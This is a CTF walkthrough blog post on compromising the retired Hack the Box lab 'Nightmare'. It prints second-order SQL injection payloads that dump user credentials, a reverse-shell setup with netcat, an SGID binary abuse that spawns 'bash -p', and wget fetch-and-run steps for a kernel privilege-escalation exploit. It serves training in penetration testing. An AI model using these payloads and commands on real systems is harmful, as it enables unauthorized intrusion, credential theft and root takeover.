@@ -1,0 +1,542 @@
+
+								
+																		Hack the Box: Nightmare Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on December 28, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Today we are going to solve another CTF challenge “Nightmare”. It is a retired vulnerable lab presented by Hack the Box for helping pentester’s to perform online penetration testing according to your experience level; they have a collection of vulnerable labs as challenges, from beginners to Expert level.
+Level: Intermediate
+Task: To find user.txt and root.txt file
+Note: Since these labs are online available therefore they have a static IP. The IP of Nightmare is 10.10.10.66
+Penetrating Methodology
+
+Network scanning (Nmap)
+Browsing IP address through HTTP
+Checking for SQL injection vulnerability
+Exploiting Second-Order Injection
+Login through SSH
+Login through SFTP
+Exploiting SFTP to gain a reverse shell
+Discovering files with SGID bit set
+Privileges escalation using “sls”
+Finding exploit for kernel
+Making changes to the exploit
+Getting root privilege using the exploit
+Getting the root flag
+
+Walkthrough
+Let’s start off with our basic nmap command to find out the open ports and services.
+
+		
+		
+			
+			
+			
+			
+nmap -sC -sV 10.10.10.66
+			
+				
+					
+				
+					1
+				
+						nmap -sC -sV 10.10.10.66
+					
+				
+			
+		
+
+
+The Nmap output shows us that there are 2 ports open: 80(HTTP), 2222(SSH)
+We find that port 80 is running http, so we open the IP in our browser.
+
+When we visit the webpage, we find a login page. After trying a few SQL injection commands we find that this page is vulnerable to “second-order SQL injection”. This means to exploit this vulnerability we have to register a user with our SQL injection query and then login with the same username.
+First, we register a user with credentials “admin’): pass” using the register link on the login page. Now when we login using this user we get an SQL error on the web page.
+
+After finding the web application is vulnerable to Second Order SQL Injection. We now find the number of columns. We register a user with the following credentials:
+
+		
+		
+			
+			
+			
+			
+Username: admin ‘) order by 3#
+Password: pass
+			
+				
+					
+				
+					12
+				
+						Username: admin ‘) order by 3#Password: pass
+					
+				
+			
+		
+
+We keep the password same for the user we register.
+
+Now when we login, we get an SQL error that means the table has less than three columns. So we again register a user using the following query:
+
+		
+		
+			
+			
+			
+			
+admin ‘) order by 2#
+			
+				
+					
+				
+					1
+				
+						admin ‘) order by 2#
+					
+				
+			
+		
+
+
+When we login, we find that we do not have an SQL error that means the table has 2 columns.
+Now we are going to find the version of SQL database it is running. To find the version of the database we are going to register with the following query:
+
+		
+		
+			
+			
+			
+			
+admin') union select 1,@@version#
+			
+				
+					
+				
+					1
+				
+						admin') union select 1,@@version#
+					
+				
+			
+		
+
+
+After finding the version we now know that it is a MySQL database. Now we find the name of the database. To find the name of the database we register with the following query:
+
+		
+		
+			
+			
+			
+			
+admin') union select 1,database()#
+			
+				
+					
+				
+					1
+				
+						admin') union select 1,database()#
+					
+				
+			
+		
+
+
+Now we get the database to be called “notes” but we want the names of all the databases on the server. So we register a user using the following query:
+
+		
+		
+			
+			
+			
+			
+admin') union select 1,group_concat(distinct table_schema) from information_schema.tables#
+			
+				
+					
+				
+					1
+				
+						admin') union select 1,group_concat(distinct table_schema) from information_schema.tables#
+					
+				
+			
+		
+
+
+We get another database called “sysadmin”; we find the table names inside “sysadmin”. To find the table names with we register the user with the following query:
+
+		
+		
+			
+			
+			
+			
+admin') union select 1,group_concat(distinct table_name) from information_schema.columns where table_schema="sysadmin"#
+			
+				
+					
+				
+					1
+				
+						admin') union select 1,group_concat(distinct table_name) from information_schema.columns where table_schema="sysadmin"#
+					
+				
+			
+		
+
+
+We find two tables called “users” and “configs”; we now find the column name inside “users” table. To find the column names we register a user with the following query:
+
+		
+		
+			
+			
+			
+			
+admin') union select 1,group_concat(distinct column_name) from information_schema.columns where table_schema="sysadmin" and table_name="users"#
+			
+				
+					
+				
+					1
+				
+						admin') union select 1,group_concat(distinct column_name) from information_schema.columns where table_schema="sysadmin" and table_name="users"#
+					
+				
+			
+		
+
+
+Now we find two columns called “username” and “password”. To find the data inside the columns we are going to register a user with the following query:
+
+		
+		
+			
+			
+			
+			
+admin') union select 1,group_concat(username,0x7c,password,0x0a) from sysadmin.users#
+			
+				
+					
+				
+					1
+				
+						admin') union select 1,group_concat(username,0x7c,password,0x0a) from sysadmin.users#
+					
+				
+			
+		
+
+
+Now we find different username passwords; we try to login through SSH using these credentials and find that we were able to login using the credentials “ftpuser:@whereyougo?” . We are unable to get a shell using SSH, instead, we tried to connect using sftp and were successfully able to login.
+
+		
+		
+			
+			
+			
+			
+ssh -p 2222 ftpuser@10.10.10.66
+sftp -p 2222 ftpuser@10.10.10.66
+			
+				
+					
+				
+					12
+				
+						ssh -p 2222 ftpuser@10.10.10.66sftp -p 2222 ftpuser@10.10.10.66
+					
+				
+			
+		
+
+
+Now as we are not able to get a shell using SSH, we tried to find sftp exploit and were able to find an exploit. You can download the exploit from here.
+
+We made changes to the exploit so that we can get a reverse shell.
+
+After making changes to the exploit, we set up our listener using netcat and then run the script.
+
+		
+		
+			
+			
+			
+			
+python sftp-exploit.py
+			
+				
+					
+				
+					1
+				
+						python sftp-exploit.py
+					
+				
+			
+		
+
+
+On our listener, we get a reverse shell.
+
+		
+		
+			
+			
+			
+			
+nc -lvp 443
+			
+				
+					
+				
+					1
+				
+						nc -lvp 443
+					
+				
+			
+		
+
+
+After getting the reverse shell we spawn a TTY shell. Then inside /home/decoder/ directory we find a directory called “test” and user called “user.txt”. As they belong to the “decoder” group, we find files that belong to the “decoder” group.
+
+		
+		
+			
+			
+			
+			
+python -c "import pty; pty.spawn('/bin/bash')"
+find / -group "decoder" 2&gt;/dev/null
+			
+				
+					
+				
+					12
+				
+						python -c "import pty; pty.spawn('/bin/bash')"find / -group "decoder" 2&gt;/dev/null
+					
+				
+			
+		
+
+
+Now running the sls command we find that it is a binary file that is running ls command. It also has an SGID bit set, so we can abuse this to escalate our privilege.
+
+We use strings command to check the binary and find that it is using system function to execute the “ls” command.
+
+		
+		
+			
+			
+			
+			
+strings /usr/bin/sls
+			
+				
+					
+				
+					1
+				
+						strings /usr/bin/sls
+					
+				
+			
+		
+
+
+Now as ls command is executed inside system function; we are going to use -b argument to execute our command.
+
+		
+		
+			
+			
+			
+			
+sls -b '
+bash -p'
+			
+				
+					
+				
+					12
+				
+						sls -b 'bash -p'
+					
+				
+			
+		
+
+After getting a shell we run “id” command and find that we have spawned a shell as user “decoder”. We now can open “user.txt” file and find the first flag.
+
+Enumerating the system we now check the kernel version to check if there is an exploit available for privilege escalation.
+
+		
+		
+			
+			
+			
+			
+uname -a
+			
+				
+					
+				
+					1
+				
+						uname -a
+					
+				
+			
+		
+
+
+We find that the version of the kernel is vulnerable to this exploit here.
+
+We download the code on our machine and compile it using gcc. Then we start python http server and send the compiled exploit file to the target machine. When we run the exploit we are unable to get a privileged shell as it shows an error saying that the kernel version is not recognized.
+In Kali machine:
+
+		
+		
+			
+			
+			
+			
+gcc -o priv 43418.c
+python -m SimpleHTTPServer 80
+			
+				
+					
+				
+					12
+				
+						gcc -o priv 43418.cpython -m SimpleHTTPServer 80
+					
+				
+			
+		
+
+On target machine:
+
+		
+		
+			
+			
+			
+			
+wget http://10.10.14.2/priv
+chmod +x priv
+./priv
+			
+				
+					
+				
+					123
+				
+						wget http://10.10.14.2/privchmod +x priv./priv
+					
+				
+			
+		
+
+
+Now we have to make a few changes for the exploit to work. So we opened the c file again and make the changes.
+
+
+Now we again compile and send the file to the target machine. This time when we run the file we get an error saying permission denied on set_groups.
+
+So we exited the shell and ran the exploit as ftpuser. As soon as we run the exploit we get a root shell.
+
+We go to /root directory and find a file called “root.txt”. When we open the file we get the final flag.
+
+Author: Sayantan Bera is a technical writer at hacking articles and cybersecurity enthusiast. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
